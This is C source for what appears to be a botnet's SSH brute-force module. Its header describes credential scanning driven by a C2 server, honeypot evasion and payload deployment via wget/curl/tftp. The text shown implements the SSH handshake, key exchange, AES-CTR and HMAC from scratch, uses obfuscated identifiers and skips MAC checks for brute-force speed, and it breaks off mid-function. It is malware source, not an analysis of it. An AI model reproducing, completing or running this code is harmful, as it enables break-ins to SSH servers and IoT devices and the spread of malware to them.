/* ==========================================================================
 *  ssh.c -- SSH 2.0 credential scanner + payload deployer
 *  Implements: curve25519-sha256/DH group14/group1 KEX, AES-128-CTR, HMAC-SHA-256/SHA-1
 *  Honeypot detection (Cowrie/Kippo banner sigs), wget/curl/tftp deploy chain
 *  Receives target IPs + combos from C2, reports hits back.
 *  Pure C, zero external deps. GCC 4.1.2 / uClibc compatible.
 * ========================================================================== */

#include "bot.h"
#include "headers/aes_tables.h"
#include "headers/scan_report.h"

#ifndef NO_SELFREP

#include <linux/tcp.h>

#ifdef DEBUG
#define SSH_DBG(fmt, ...) fprintf(stderr, "[ssh] " fmt "\n", ##__VA_ARGS__)
#else
#define SSH_DBG(fmt, ...) ((void)0)
#endif

/* ======================================================================
   CONSTANTS
   ====================================================================== */

#define SSH_PORT            22
#define SSH_CONNECT_TIMEOUT 5
#define SSH_READ_TIMEOUT    10
#define SSH_MAX_PACKET      35000
#define SSH_MAX_TARGETS     10000
#define SSH_MAX_COMBOS      500

/* SSH message types */
#define SSH_MSG_DISCONNECT       1
#define SSH_MSG_KEXINIT          20
#define SSH_MSG_NEWKEYS          21
#define SSH_MSG_KEXDH_INIT       30
#define SSH_MSG_KEXDH_REPLY      31
#define SSH_MSG_SERVICE_REQUEST  5
#define SSH_MSG_SERVICE_ACCEPT   6
#define SSH_MSG_USERAUTH_REQUEST      50
#define SSH_MSG_USERAUTH_FAILURE      51
#define SSH_MSG_USERAUTH_SUCCESS      52
#define SSH_MSG_USERAUTH_INFO_REQUEST 60
#define SSH_MSG_USERAUTH_INFO_RESPONSE 61
#define SSH_MSG_CHANNEL_OPEN         90
#define SSH_MSG_CHANNEL_OPEN_CONFIRM 91
#define SSH_MSG_CHANNEL_REQUEST      98

/* DH Group 14 prime (2048-bit, RFC 3526) */
#define DH14_SIZE 256

static const uint8_t dh14_p[DH14_SIZE] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xC9,0x0F,0xDA,0xA2,
    0x21,0x68,0xC2,0x34,0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1,
    0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,0x02,0x0B,0xBE,0xA6,
    0x3B,0x13,0x9B,0x22,0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,
    0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B,0x30,0x2B,0x0A,0x6D,
    0xF2,0x5F,0x14,0x37,0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45,
    0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,0xF4,0x4C,0x42,0xE9,
    0xA6,0x37,0xED,0x6B,0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,
    0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5,0xAE,0x9F,0x24,0x11,
    0x7C,0x4B,0x1F,0xE6,0x49,0x28,0x66,0x51,0xEC,0xE4,0x5B,0x3D,
    0xC2,0x00,0x7C,0xB8,0xA1,0x63,0xBF,0x05,0x98,0xDA,0x48,0x36,
    0x1C,0x55,0xD3,0x9A,0x69,0x16,0x3F,0xA8,0xFD,0x24,0xCF,0x5F,
    0x83,0x65,0x5D,0x23,0xDC,0xA3,0xAD,0x96,0x1C,0x62,0xF3,0x56,
    0x20,0x85,0x52,0xBB,0x9E,0xD5,0x29,0x07,0x70,0x96,0x96,0x6D,
    0x67,0x0C,0x35,0x4E,0x4A,0xBC,0x98,0x04,0xF1,0x74,0x6C,0x08,
    0xCA,0x18,0x21,0x7C,0x32,0x90,0x5E,0x46,0x2E,0x36,0xCE,0x3B,
    0xE3,0x9E,0x77,0x2C,0x18,0x0E,0x86,0x03,0x9B,0x27,0x83,0xA2,
    0xEC,0x07,0xA2,0x8F,0xB5,0xC5,0x5D,0xF0,0x6F,0x4C,0x52,0xC9,
    0xDE,0x2B,0xCB,0xF6,0x95,0x58,0x17,0x18,0x39,0x95,0x49,0x7C,
    0xEA,0x95,0x6A,0xE5,0x15,0xD2,0x26,0x18,0x98,0xFA,0x05,0x10,
    0x15,0x72,0x8E,0x5A,0x8A,0xAC,0xAA,0x68,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF
};
static const uint8_t dh14_g = 2;

/* DH Group 1 prime (1024-bit, RFC 2409 / Oakley Group 2) -- fallback for old devices */
#define DH1_SIZE 128
static const uint8_t dh1_p[DH1_SIZE] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xC9,0x0F,0xDA,0xA2,
    0x21,0x68,0xC2,0x34,0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1,
    0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,0x02,0x0B,0xBE,0xA6,
    0x3B,0x13,0x9B,0x22,0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,
    0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B,0x30,0x2B,0x0A,0x6D,
    0xF2,0x5F,0x14,0x37,0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45,
    0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,0xF4,0x4C,0x42,0xE9,
    0xA6,0x37,0xED,0x6B,0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,
    0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5,0xAE,0x9F,0x24,0x11,
    0x7C,0x4B,0x1F,0xE6,0x49,0x28,0x66,0x51,0xEC,0xE6,0x53,0x81,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
};

/* Client banner — decrypted at runtime from config (_sB8nn3r) */
#define ssh_client_banner ds_cstr(&_sB8nn3r)

/* ======================================================================
   BIGNUM — minimal big-endian unsigned integer arithmetic
   Only what DH needs: mul, mod, modexp
   ====================================================================== */

#define BN_MAX 520  /* enough for intermediate products of 2048-bit numbers */

typedef struct {
    uint8_t d[BN_MAX];
    int     len;        /* number of significant bytes */
} bn_t;

static void bn_zero(bn_t *a) { memset(a->d, 0, BN_MAX); a->len = 1; }

static void bn_from_bytes(bn_t *a, const uint8_t *data, int len) {
    int off;
    bn_zero(a);
    if (len > BN_MAX) len = BN_MAX;
    off = BN_MAX - len;
    memcpy(a->d + off, data, len);
    a->len = len;
}

static void bn_from_u32(bn_t *a, uint32_t v) {
    bn_zero(a);
    a->d[BN_MAX-1] = (uint8_t)(v & 0xFF);
    a->d[BN_MAX-2] = (uint8_t)((v >> 8) & 0xFF);
    a->d[BN_MAX-3] = (uint8_t)((v >> 16) & 0xFF);
    a->d[BN_MAX-4] = (uint8_t)((v >> 24) & 0xFF);
    a->len = 4;
}

static int bn_to_bytes(const bn_t *a, uint8_t *out, int max) {
    int start = 0, len, i;
    /* scan from MSB — don't trust a->len, it drifts through mul/mod */
    while (start < BN_MAX - 1 && a->d[start] == 0) start++;
    len = BN_MAX - start;
    if (len > max) return -1;
    for (i = 0; i < len; i++) out[i] = a->d[start + i];
    return len;
}

static int bn_cmp(const bn_t *a, const bn_t *b) {
    int i;
    for (i = 0; i < BN_MAX; i++) {
        if (a->d[i] < b->d[i]) return -1;
        if (a->d[i] > b->d[i]) return 1;
    }
    return 0;
}

static void bn_copy(bn_t *dst, const bn_t *src) {
    memcpy(dst->d, src->d, BN_MAX);
    dst->len = src->len;
}

/* a = a + b (in place, no overflow check needed for our sizes) */
static void bn_add(bn_t *a, const bn_t *b) {
    int i;
    uint16_t carry = 0;
    for (i = BN_MAX - 1; i >= 0; i--) {
        uint16_t s = (uint16_t)a->d[i] + (uint16_t)b->d[i] + carry;
        a->d[i] = (uint8_t)(s & 0xFF);
        carry = s >> 8;
    }
    if (a->len < b->len) a->len = b->len;
}

/* a = a - b (assumes a >= b) */
static void bn_sub(bn_t *a, const bn_t *b) {
    int i;
    int16_t borrow = 0;
    for (i = BN_MAX - 1; i >= 0; i--) {
        int16_t s = (int16_t)a->d[i] - (int16_t)b->d[i] - borrow;
        if (s < 0) { s += 256; borrow = 1; }
        else { borrow = 0; }
        a->d[i] = (uint8_t)s;
    }
}

/* a = a << 1 (left shift by 1 bit) */
static void bn_shl1(bn_t *a) {
    int i;
    uint8_t carry = 0;
    for (i = BN_MAX - 1; i >= 0; i--) {
        uint8_t nc = (a->d[i] >> 7) & 1;
        a->d[i] = (uint8_t)((a->d[i] << 1) | carry);
        carry = nc;
    }
}

/* r = a mod m (using repeated subtraction — fine for DH sizes) */
static void bn_mod(bn_t *r, const bn_t *a, const bn_t *m) {
    bn_t tmp, shifted_m;
    int bit, i;
    bn_copy(r, a);

    /* Find highest bit of r */
    bit = 0;
    for (i = 0; i < BN_MAX; i++) {
        if (r->d[i]) { bit = (BN_MAX - i) * 8; break; }
    }
    if (bit == 0) return;

    /* Shift m up to align with r, then subtract down */
    bn_copy(&shifted_m, m);
    {
        int m_bit = 0;
        for (i = 0; i < BN_MAX; i++) {
            if (shifted_m.d[i]) { m_bit = (BN_MAX - i) * 8; break; }
        }
        while (m_bit < bit) { bn_shl1(&shifted_m); m_bit++; }
    }

    while (bn_cmp(&shifted_m, m) >= 0) {
        if (bn_cmp(r, &shifted_m) >= 0)
            bn_sub(r, &shifted_m);
        /* shift m right by 1 */
        {
            int j;
            uint8_t carry = 0;
            for (j = 0; j < BN_MAX; j++) {
                uint8_t nc = (shifted_m.d[j] & 1) << 7;
                shifted_m.d[j] = (shifted_m.d[j] >> 1) | carry;
                carry = nc;
            }
        }
    }
}

/* r = (a * b) mod m */
static void bn_mulmod(bn_t *r, const bn_t *a, const bn_t *b, const bn_t *m) {
    bn_t acc, base;
    int i, j;
    bn_zero(&acc);
    bn_copy(&base, a);
    bn_mod(&base, &base, m);

    /* Iterate bits of b from LSB to MSB */
    for (i = BN_MAX - 1; i >= 0; i--) {
        for (j = 0; j < 8; j++) {
            if ((b->d[i] >> j) & 1) {
                bn_add(&acc, &base);
                if (bn_cmp(&acc, m) >= 0) bn_sub(&acc, m);
            }
            bn_shl1(&base);
            if (bn_cmp(&base, m) >= 0) bn_sub(&base, m);
        }
    }
    bn_copy(r, &acc);
}

/* r = base^exp mod m (square-and-multiply) */
static void bn_modexp(bn_t *r, const bn_t *base, const bn_t *exp, const bn_t *m) {
    bn_t result, b;
    int i, j, started;
    bn_from_u32(&result, 1);
    bn_copy(&b, base);
    bn_mod(&b, &b, m);

    started = 0;
    for (i = 0; i < BN_MAX; i++) {
        for (j = 7; j >= 0; j--) {
            if (!started) {
                if ((exp->d[i] >> j) & 1) {
                    bn_copy(&result, &b);
                    started = 1;
                }
                continue;
            }
            bn_mulmod(&result, &result, &result, m);
            if ((exp->d[i] >> j) & 1) {
                bn_mulmod(&result, &result, &b, m);
            }
        }
    }
    bn_copy(r, &result);
}

/* ======================================================================
   HMAC-SHA-256
   ====================================================================== */

/* _no3nm7v is now in crypto.c — shared across all modules */

/* ======================================================================
   AES-128-CTR
   ====================================================================== */

static void aes128_expand_key(const uint8_t key[16], uint32_t rk[44]) {
    int i;
    uint32_t t;
    for (i = 0; i < 4; i++)
        rk[i]=((uint32_t)key[i*4]<<24)|((uint32_t)key[i*4+1]<<16)|
              ((uint32_t)key[i*4+2]<<8)|(uint32_t)key[i*4+3];
    for (i = 4; i < 44; i++) {
        t = rk[i-1];
        if (i%4==0) {
            t=((uint32_t)_aA7wX2u[(t>>16)&0xFF]<<24)|((uint32_t)_aA7wX2u[(t>>8)&0xFF]<<16)|
              ((uint32_t)_aA7wX2u[t&0xFF]<<8)|(uint32_t)_aA7wX2u[(t>>24)&0xFF];
            t ^= (uint32_t)_gt8ZM5S[i/4] << 24;
        }
        rk[i] = rk[i-4] ^ t;
    }
}

static void aes128_encrypt_block(const uint32_t rk[44], uint8_t block[16]) {
    uint8_t s[16], t[16], tmp;
    int round, i, ki, cc;
    uint8_t a0,a1,a2,a3,x;
    memcpy(s, block, 16);
    for (i = 0; i < 4; i++) {
        s[i*4]^=(uint8_t)(rk[i]>>24); s[i*4+1]^=(uint8_t)(rk[i]>>16);
        s[i*4+2]^=(uint8_t)(rk[i]>>8); s[i*4+3]^=(uint8_t)(rk[i]);
    }
    for (round = 1; round <= 10; round++) {
        for (i = 0; i < 16; i++) t[i] = _aA7wX2u[s[i]];
        tmp=t[1]; t[1]=t[5]; t[5]=t[9]; t[9]=t[13]; t[13]=tmp;
        tmp=t[2]; t[2]=t[10]; t[10]=tmp; tmp=t[6]; t[6]=t[14]; t[14]=tmp;
        tmp=t[15]; t[15]=t[11]; t[11]=t[7]; t[7]=t[3]; t[3]=tmp;
        if (round < 10) {
            for (cc = 0; cc < 4; cc++) {
                a0=t[cc*4]; a1=t[cc*4+1]; a2=t[cc*4+2]; a3=t[cc*4+3];
                x=a0^a1^a2^a3;
                s[cc*4]=a0^aes_xtime(a0^a1)^x; s[cc*4+1]=a1^aes_xtime(a1^a2)^x;
                s[cc*4+2]=a2^aes_xtime(a2^a3)^x; s[cc*4+3]=a3^aes_xtime(a3^a0)^x;
            }
        } else { memcpy(s, t, 16); }
        for (i = 0; i < 4; i++) {
            ki = round*4+i;
            s[i*4]^=(uint8_t)(rk[ki]>>24); s[i*4+1]^=(uint8_t)(rk[ki]>>16);
            s[i*4+2]^=(uint8_t)(rk[ki]>>8); s[i*4+3]^=(uint8_t)(rk[ki]);
        }
    }
    memcpy(block, s, 16);
}

typedef struct {
    uint32_t rk[44];
    uint8_t  ctr[16];
    uint8_t  ks[16];
    int      ks_pos;
} aes128ctr_t;

static void aes128ctr_init(aes128ctr_t *c, const uint8_t key[16], const uint8_t iv[16]) {
    aes128_expand_key(key, c->rk);
    memcpy(c->ctr, iv, 16);
    c->ks_pos = 16;
}

static void aes128ctr_crypt(aes128ctr_t *c, uint8_t *data, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        if (c->ks_pos >= 16) {
            memcpy(c->ks, c->ctr, 16);
            aes128_encrypt_block(c->rk, c->ks);
            /* increment counter */
            {
                int j;
                for (j = 15; j >= 0; j--) if (++c->ctr[j] != 0) break;
            }
            c->ks_pos = 0;
        }
        data[i] ^= c->ks[c->ks_pos++];
    }
}

/* ======================================================================
   AES-256-CTR
   ====================================================================== */

typedef struct {
    uint32_t rk[60];
    uint8_t  ctr[16];
    uint8_t  ks[16];
    int      ks_pos;
} aes256ctr_t;

static uint32_t aes_sub_word(uint32_t w) {
    return ((uint32_t)_aA7wX2u[(w>>24)&0xFF]<<24)|((uint32_t)_aA7wX2u[(w>>16)&0xFF]<<16)|
           ((uint32_t)_aA7wX2u[(w>>8)&0xFF]<<8)|(uint32_t)_aA7wX2u[w&0xFF];
}

static void _vd6da5u(const uint8_t key[32], uint32_t rk[60]) {
    int i;
    for (i = 0; i < 8; i++)
        rk[i]=((uint32_t)key[i*4]<<24)|((uint32_t)key[i*4+1]<<16)|
              ((uint32_t)key[i*4+2]<<8)|(uint32_t)key[i*4+3];
    for (i = 8; i < 60; i++) {
        uint32_t t = rk[i-1];
        if (i%8==0) {
            t = aes_sub_word((t<<8)|(t>>24));
            t ^= (uint32_t)_gt8ZM5S[i/8] << 24;
        } else if (i%8==4) {
            t = aes_sub_word(t);
        }
        rk[i] = rk[i-8] ^ t;
    }
}

static void _Mi6Kt2o(const uint32_t rk[60], uint8_t block[16]) {
    uint8_t s[16], t[16], tmp;
    int round, i, ki, cc;
    uint8_t a0,a1,a2,a3,x;
    memcpy(s, block, 16);
    for (i = 0; i < 4; i++) {
        s[i*4]^=(uint8_t)(rk[i]>>24); s[i*4+1]^=(uint8_t)(rk[i]>>16);
        s[i*4+2]^=(uint8_t)(rk[i]>>8); s[i*4+3]^=(uint8_t)(rk[i]);
    }
    for (round = 1; round <= 14; round++) {
        for (i = 0; i < 16; i++) t[i] = _aA7wX2u[s[i]];
        tmp=t[1];t[1]=t[5];t[5]=t[9];t[9]=t[13];t[13]=tmp;
        tmp=t[2];t[2]=t[10];t[10]=tmp; tmp=t[6];t[6]=t[14];t[14]=tmp;
        tmp=t[15];t[15]=t[11];t[11]=t[7];t[7]=t[3];t[3]=tmp;
        if (round < 14) {
            for (cc=0;cc<4;cc++) {
                a0=t[cc*4];a1=t[cc*4+1];a2=t[cc*4+2];a3=t[cc*4+3];
                x=a0^a1^a2^a3;
                s[cc*4]=a0^aes_xtime(a0^a1)^x; s[cc*4+1]=a1^aes_xtime(a1^a2)^x;
                s[cc*4+2]=a2^aes_xtime(a2^a3)^x; s[cc*4+3]=a3^aes_xtime(a3^a0)^x;
            }
        } else { memcpy(s, t, 16); }
        for (i = 0; i < 4; i++) {
            ki = round*4+i;
            s[i*4]^=(uint8_t)(rk[ki]>>24); s[i*4+1]^=(uint8_t)(rk[ki]>>16);
            s[i*4+2]^=(uint8_t)(rk[ki]>>8); s[i*4+3]^=(uint8_t)(rk[ki]);
        }
    }
    memcpy(block, s, 16);
}

static void aes256ctr_init(aes256ctr_t *c, const uint8_t key[32], const uint8_t iv[16]) {
    _vd6da5u(key, c->rk);
    memcpy(c->ctr, iv, 16);
    c->ks_pos = 16;
}

static void aes256ctr_crypt(aes256ctr_t *c, uint8_t *data, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        if (c->ks_pos >= 16) {
            memcpy(c->ks, c->ctr, 16);
            _Mi6Kt2o(c->rk, c->ks);
            { int j; for (j = 15; j >= 0; j--) if (++c->ctr[j] != 0) break; }
            c->ks_pos = 0;
        }
        data[i] ^= c->ks[c->ks_pos++];
    }
}

/* ======================================================================
   SHA-1 (minimal, for kex fallback) -- prefixed to avoid scanner_mysql conflict
   ====================================================================== */

typedef struct { uint32_t state[5]; uint64_t count; uint8_t buffer[64]; } ssh_sha1_ctx;

#define SSH_SHA1_ROTL(x,n) (((x)<<(n))|((x)>>(32-(n))))

static void ssh_sha1_transform(ssh_sha1_ctx *ctx, const uint8_t block[64]) {
    uint32_t w[80], a,b,c,d,e,f,k,temp; int i;
    for(i=0;i<16;i++) w[i]=((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|((uint32_t)block[i*4+2]<<8)|(uint32_t)block[i*4+3];
    for(i=16;i<80;i++) w[i]=SSH_SHA1_ROTL(w[i-3]^w[i-8]^w[i-14]^w[i-16],1);
    a=ctx->state[0];b=ctx->state[1];c=ctx->state[2];d=ctx->state[3];e=ctx->state[4];
    for(i=0;i<80;i++){
        if(i<20){f=(b&c)|((~b)&d);k=0x5A827999;}
        else if(i<40){f=b^c^d;k=0x6ED9EBA1;}
        else if(i<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC;}
        else{f=b^c^d;k=0xCA62C1D6;}
        temp=SSH_SHA1_ROTL(a,5)+f+e+k+w[i];e=d;d=c;c=SSH_SHA1_ROTL(b,30);b=a;a=temp;
    }
    ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;ctx->state[4]+=e;
}

static void ssh_sha1_init(ssh_sha1_ctx *c){c->state[0]=0x67452301;c->state[1]=0xEFCDAB89;c->state[2]=0x98BADCFE;c->state[3]=0x10325476;c->state[4]=0xC3D2E1F0;c->count=0;}
static void ssh_sha1_update(ssh_sha1_ctx *c,const uint8_t *d,size_t l){size_t i;size_t idx=c->count%64;c->count+=l;for(i=0;i<l;i++){c->buffer[idx++]=d[i];if(idx==64){ssh_sha1_transform(c,c->buffer);idx=0;}}}
static void ssh_sha1_final(ssh_sha1_ctx *c,uint8_t h[20]){
    uint64_t bits=c->count*8;uint8_t p=0x80;ssh_sha1_update(c,&p,1);p=0;
    while(c->count%64!=56)ssh_sha1_update(c,&p,1);
    {uint8_t b[8];int i;for(i=0;i<8;i++)b[i]=(uint8_t)(bits>>((7-i)*8));ssh_sha1_update(c,b,8);}
    {int i;for(i=0;i<5;i++){h[i*4]=(uint8_t)(c->state[i]>>24);h[i*4+1]=(uint8_t)(c->state[i]>>16);h[i*4+2]=(uint8_t)(c->state[i]>>8);h[i*4+3]=(uint8_t)c->state[i];}}
}

static void ssh_sha1_oneshot(const uint8_t *data, size_t len, uint8_t out[20]) {
    ssh_sha1_ctx ctx; ssh_sha1_init(&ctx); ssh_sha1_update(&ctx, data, len); ssh_sha1_final(&ctx, out);
}

static void hmac_sha1(const uint8_t *key, size_t key_len,
                      const uint8_t *msg, size_t msg_len,
                      uint8_t out[20]) {
    ssh_sha1_ctx ctx;
    uint8_t k_pad[64], inner[20], key_block[64];
    size_t i;
    memset(key_block, 0, 64);
    if (key_len > 64) {
        ssh_sha1_oneshot(key, key_len, key_block);
    } else {
        memcpy(key_block, key, key_len);
    }
    for (i = 0; i < 64; i++) k_pad[i] = key_block[i] ^ 0x36;
    ssh_sha1_init(&ctx); ssh_sha1_update(&ctx, k_pad, 64);
    ssh_sha1_update(&ctx, msg, msg_len); ssh_sha1_final(&ctx, inner);
    for (i = 0; i < 64; i++) k_pad[i] = key_block[i] ^ 0x5c;
    ssh_sha1_init(&ctx); ssh_sha1_update(&ctx, k_pad, 64);
    ssh_sha1_update(&ctx, inner, 20); ssh_sha1_final(&ctx, out);
}

/* ======================================================================
   KEX algorithm selection
   ====================================================================== */

typedef enum {
    KEX_NONE = -1,
    KEX_CURVE25519_SHA256,
    KEX_DH_GROUP14_SHA256,
    KEX_DH_GROUP14_SHA1,
    KEX_DH_GROUP1_SHA1
} kex_algo_t;

/* ======================================================================
   SSH PACKET I/O
   ====================================================================== */

typedef struct {
    int          fd;
    aes128ctr_t  enc128;
    aes128ctr_t  dec128;
    aes256ctr_t  enc256;
    aes256ctr_t  dec256;
    int          cipher_256;
    uint8_t      enc_key[32], dec_key[32];
    uint8_t      enc_mac[32], dec_mac[32];
    uint32_t     send_seq;
    uint32_t     recv_seq;
    int          encrypted;
    uint8_t      session_id[32];
    kex_algo_t   kex_algo;
    int          hash_len;  /* 32 for SHA-256, 20 for SHA-1 */
    uint32_t     next_chan;  /* monotonic channel ID for exec */
    char         banner[256]; /* server banner for honeypot detection */
} _Rz8vk8z;

static void ssh_encrypt(_Rz8vk8z *c, uint8_t *data, size_t len) {
    if (c->cipher_256) aes256ctr_crypt(&c->enc256, data, len);
    else aes128ctr_crypt(&c->enc128, data, len);
}
static void ssh_decrypt(_Rz8vk8z *c, uint8_t *data, size_t len) {
    if (c->cipher_256) aes256ctr_crypt(&c->dec256, data, len);
    else aes128ctr_crypt(&c->dec128, data, len);
}

/* Write raw bytes */
static int ssh_write_raw(_Rz8vk8z *c, const uint8_t *data, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(c->fd, data + off, len - off);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

/* Read exactly n bytes with timeout */
static int ssh_read_exact(_Rz8vk8z *c, uint8_t *buf, size_t n) {
    size_t off = 0;
    struct pollfd pfd;
    pfd.fd = c->fd;
    pfd.events = POLLIN;
    while (off < n) {
        ssize_t r;
        if (poll(&pfd, 1, SSH_READ_TIMEOUT * 1000) <= 0) return -1;
        r = read(c->fd, buf + off, n - off);
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}

/* Send SSH packet */
static int ssh_send_packet(_Rz8vk8z *c, const uint8_t *payload, size_t plen) {
    uint8_t buf[SSH_MAX_PACKET + 64];
    size_t total, pad_len, i;
    uint32_t seq;

    /* packet: length(4) + padding_length(1) + payload + padding */
    pad_len = 16 - ((plen + 5) % 16);
    if (pad_len < 4) pad_len += 16;
    total = 4 + 1 + plen + pad_len;

    /* length field (excludes itself) */
    buf[0] = (uint8_t)((total - 4) >> 24);
    buf[1] = (uint8_t)((total - 4) >> 16);
    buf[2] = (uint8_t)((total - 4) >> 8);
    buf[3] = (uint8_t)(total - 4);
    buf[4] = (uint8_t)pad_len;
    memcpy(buf + 5, payload, plen);
    urandom_bytes(buf + 5 + plen, pad_len);

    if (c->encrypted) {
        /* MAC: HMAC over (sequence_number || unencrypted_packet) */
        uint8_t macbuf[4 + SSH_MAX_PACKET + 64];
        uint8_t mac[32];
        seq = c->send_seq;
        macbuf[0] = (uint8_t)(seq >> 24);
        macbuf[1] = (uint8_t)(seq >> 16);
        macbuf[2] = (uint8_t)(seq >> 8);
        macbuf[3] = (uint8_t)seq;
        memcpy(macbuf + 4, buf, total);
        if (c->hash_len == 20) {
            hmac_sha1(c->enc_mac, 20, macbuf, 4 + total, mac);
        } else {
            _no3nm7v(c->enc_mac, 32, macbuf, 4 + total, mac);
        }

        ssh_encrypt(c, buf, total);
        memcpy(buf + total, mac, c->hash_len);
        total += (size_t)c->hash_len;
    }

    c->send_seq++;
    return ssh_write_raw(c, buf, total);
}

/* Receive SSH packet — returns payload length, payload starts at buf+0 */
static int _ay7CX5V(_Rz8vk8z *c, uint8_t *payload, size_t max_payload) {
    uint8_t hdr[4];
    uint32_t pkt_len;
    uint8_t *pkt;
    uint8_t pad_len;
    size_t payload_len;

    if (ssh_read_exact(c, hdr, 4) < 0) return -1;

    if (c->encrypted) ssh_decrypt(c, hdr, 4);

    pkt_len = ((uint32_t)hdr[0]<<24)|((uint32_t)hdr[1]<<16)|
              ((uint32_t)hdr[2]<<8)|(uint32_t)hdr[3];

    if (pkt_len > SSH_MAX_PACKET || pkt_len < 2) return -1;

    pkt = (uint8_t *)malloc(pkt_len + 32);
    if (!pkt) return -1;

    if (ssh_read_exact(c, pkt, pkt_len + (c->encrypted ? (size_t)c->hash_len : 0)) < 0) {
        free(pkt);
        return -1;
    }

    if (c->encrypted) {
        ssh_decrypt(c, pkt, pkt_len);
        /* TODO: verify MAC (skip for brute force — speed > security) */
    }

    pad_len = pkt[0];
    if (pad_len >= pkt_len - 1) { free(pkt); return -1; }
    payload_len = pkt_len - 1 - pad_len;
    if (payload_len > max_payload) payload_len = max_payload;
    memcpy(payload, pkt + 1, payload_len);

    free(pkt);
    c->recv_seq++;
    return (int)payload_len;
}

/* ======================================================================
   SSH HANDSHAKE
   ====================================================================== */

/* Build KEXINIT packet */
static int _dU6Up5e(uint8_t *buf) {
    int pos = 0;
    int i;
    const char *kex_alg = "curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1";
    const char *host_key = "ssh-rsa,ssh-ed25519";
    const char *cipher = "aes128-ctr,aes256-ctr";
    const char *mac = "hmac-sha2-256,hmac-sha1";
    const char *comp = "none";
    const char *lang = "";
    const char *name_lists[] = {kex_alg, host_key, cipher, cipher, mac, mac, comp, comp, lang, lang};

    buf[pos++] = SSH_MSG_KEXINIT;
    urandom_bytes(buf + pos, 16); pos += 16; /* cookie */

    for (i = 0; i < 10; i++) {
        uint32_t slen = (uint32_t)strlen(name_lists[i]);
        buf[pos++] = (uint8_t)(slen >> 24);
        buf[pos++] = (uint8_t)(slen >> 16);
        buf[pos++] = (uint8_t)(slen >> 8);
        buf[pos++] = (uint8_t)slen;
        memcpy(buf + pos, name_lists[i], slen);
        pos += slen;
    }

    buf[pos++] = 0; /* first_kex_packet_follows */
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* reserved */

    return pos;
}

/* Check if algo appears as a complete entry in the comma-separated namelist */
static int _Cq8Hn7J(const char *namelist, const char *algo) {
    const char *p = namelist;
    int alen = (int)strlen(algo);
    while ((p = strstr(p, algo)) != NULL) {
        if ((p == namelist || *(p-1) == ',') && (p[alen] == ',' || p[alen] == '\0'))
            return 1;
        p += alen;
    }
    return 0;
}

/* Parse server KEXINIT to select best mutually-supported kex algorithm */
static kex_algo_t ssh_select_kex(const uint8_t *server_kexinit, int len) {
    /* Skip msg type (1) + cookie (16) = 17 bytes, then first name-list is kex algorithms */
    int pos = 17;
    uint32_t nlen;
    char namelist[2048];

    if (pos + 4 > len) return KEX_DH_GROUP14_SHA256;
    nlen = ((uint32_t)server_kexinit[pos]<<24)|((uint32_t)server_kexinit[pos+1]<<16)|
           ((uint32_t)server_kexinit[pos+2]<<8)|(uint32_t)server_kexinit[pos+3];
    pos += 4;
    if (nlen >= sizeof(namelist) || pos + (int)nlen > len) return KEX_DH_GROUP14_SHA256;
    memcpy(namelist, server_kexinit + pos, nlen);
    namelist[nlen] = '\0';

    /* Our preference order: curve25519 > group14-sha256 > group14-sha1 > group1-sha1 */
    if (_Cq8Hn7J(namelist, "curve25519-sha256"))
        return KEX_CURVE25519_SHA256;
    if (_Cq8Hn7J(namelist, "curve25519-sha256@libssh.org"))
        return KEX_CURVE25519_SHA256;
    if (_Cq8Hn7J(namelist, "diffie-hellman-group14-sha256"))
        return KEX_DH_GROUP14_SHA256;
    if (_Cq8Hn7J(namelist, "diffie-hellman-group14-sha1"))
        return KEX_DH_GROUP14_SHA1;
    if (_Cq8Hn7J(namelist, "diffie-hellman-group1-sha1"))
        return KEX_DH_GROUP1_SHA1;

    SSH_DBG("no common kex algorithm found in server list: %s", namelist);
    return KEX_NONE;
}

/* Derive a session key (RFC 4253 §7.2) */
static void _kA7Bv2Y(const uint8_t *K, int Klen,
                           const uint8_t *H,
                           uint8_t letter,
                           const uint8_t *session_id,
                           uint8_t *out, int out_len,
                           int hash_len)
{
    uint8_t klen_be[4];
    klen_be[0] = (uint8_t)(Klen >> 24);
    klen_be[1] = (uint8_t)(Klen >> 16);
    klen_be[2] = (uint8_t)(Klen >> 8);
    klen_be[3] = (uint8_t)Klen;

    if (hash_len == 20) {
        ssh_sha1_ctx ctx;
        uint8_t hash[20];
        ssh_sha1_init(&ctx);
        ssh_sha1_update(&ctx, klen_be, 4);
        ssh_sha1_update(&ctx, K, Klen);
        ssh_sha1_update(&ctx, H, 20);
        ssh_sha1_update(&ctx, &letter, 1);
        ssh_sha1_update(&ctx, session_id, 20);
